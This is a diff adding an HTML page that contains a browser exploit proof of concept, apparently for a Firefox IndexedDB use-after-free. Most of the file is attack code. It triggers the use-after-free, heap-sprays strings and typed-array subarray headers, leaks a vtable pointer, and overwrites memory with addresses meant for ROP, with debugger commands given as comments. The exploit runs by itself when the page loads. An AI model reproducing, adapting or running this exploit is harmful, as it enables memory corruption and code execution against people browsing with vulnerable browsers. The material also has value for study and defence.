@@ -1,0 +1,127 @@
+<!doctype html>
+
+<body></body>
+
+<script>
+
+var SPRAY = 0x1000000 / 2;
+var PATTERN = "\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\uAAAA\ud220\u218b\uFF85\uFFFF\uffff\u218f\uFF85\uFFFF";
+//0x218bd220 : #0x17a44 0x10 0x218ff00c 0x218ff044 [ 0x218bd00c ] > 0x218bd220
+//0x218fffff : #0x1ffff 0x80000000L 0x219000c0 0x219000f8 [ 0x218ff00c ] > 0x218fffff
+
+//dd 0x218bd00c; dd 0x219000f8; ba w4 0x218ff00c ".if poi(0x218ff00c) = 0x10 {} .else {gc}"
+
+//if you want not to wait till correct substr object position, just force value ;)
+//dd 0x218bd00c; dd 0x219000f8; ed 0x218bd00c 0x12; ba w4 0x218ff00c ".if poi(0x218ff00c) = 0x10 {} .else {gc}"
+
+function UsignedXWORD(a)
+{
+	return (a << 1) >>> 1;
+}
+
+function EndianToXWORD(aBuff, pos, size)
+{
+	var xword = 0;
+	
+	for (var i = 0; i < size; i++)
+		xword = (xword << 8) | aBuff[pos + (size - 1) - i];
+	return xword;
+}
+
+function PatchXWORD(aBuff, xword, pos, size)
+{
+	for (var i = 0; i < size; i++)
+	{
+		aBuff[pos + i] = xword & 0xFF;
+		xword = (xword >> 8);
+	}
+}
+
+//mozjs!js::ArrayBuffer::obj_lookupProperty
+function LeakSomeVtable(explorer, pos)
+{
+	var poi = EndianToXWORD(explorer, 0x70, 4);
+	var ind = UsignedXWORD(poi - pos);
+	
+	poi = EndianToXWORD(explorer, ind, 4);
+	ind = UsignedXWORD(poi - pos);
+	
+	poi = EndianToXWORD(explorer, ind, 4);
+
+	//ind = UsignedXWORD(poi - pos);		
+	//poi = EndianToXWORD(explorer, ind + 0x60, 4);	
+	return poi;			
+}
+
+function TriggerUseAfterFree()
+{
+	IDBKeyRange.only(43).lower;
+}
+
+var gMemory = new Array();
+function ExchangeObjectUseAfterFree()
+{
+//CVE
+
+	//trigger
+	for (var foo = 0; foo < 0x1; foo++)
+     TriggerUseAfterFree();
+	
+	for(var i = 0; i < 0x100000; i++)
+	{
+		var block = String.fromCharCode(("A").charCodeAt() + i % 0xFF);
+		block += PATTERN;
+		
+		gMemory[i] = block.substr(0, block.length);
+	}
+}
+
+function PublicExploitPOC()
+{
+	ExchangeObjectUseAfterFree();
+	
+	var pupet = new Uint8Array([0x45, 0x45, 0x47, 0x48]);
+	var pupet_position_leak =  new Uint8Array([0x45, 0x45, 0x47, 0x48]);
+
+//perform HEAP-SPRAY by subarray's headers!
+	var subs = new Array();
+	for (var i = 0; i < SPRAY; i++)
+	{
+		subs[subs.length] = pupet.subarray(0, pupet.length);//0x50 bytes for header
+		subs[subs.length] = "123456789a".substr(0,8);
+	}
+
+	alert("Count of SubArray - headers : " + subs.length);
+			
+	for(var i = 0; i < subs.length; i++)
+	{
+		if (!(i % 2) && subs[i].length != pupet.length)
+		{		
+			//get current position == f.e. ROP position
+			var img_addr = EndianToXWORD(subs[i], 0x7c, 4);
+			var pos = img_addr - 0x90;
+			
+			alert("position info : " + pos.toString(0x10) + " " + subs[i].length);
+			
+			//get some VTable
+			var leak = LeakSomeVtable(subs[i], pos);
+			alert(leak.toString(0x10));
+			
+			//how easy is to write own ptr's ?
+			var ind = UsignedXWORD(leak - pos);
+			for (var j = 0; j < 0x10; j++)
+			{
+				//address to ROP ?
+				PatchXWORD(subs[i], pos, ind + j*4, 4);
+			}
+		}
+	}
+	
+	alert("finish");
+}
+
+PublicExploitPOC();
+
+</script>
+
+</html>
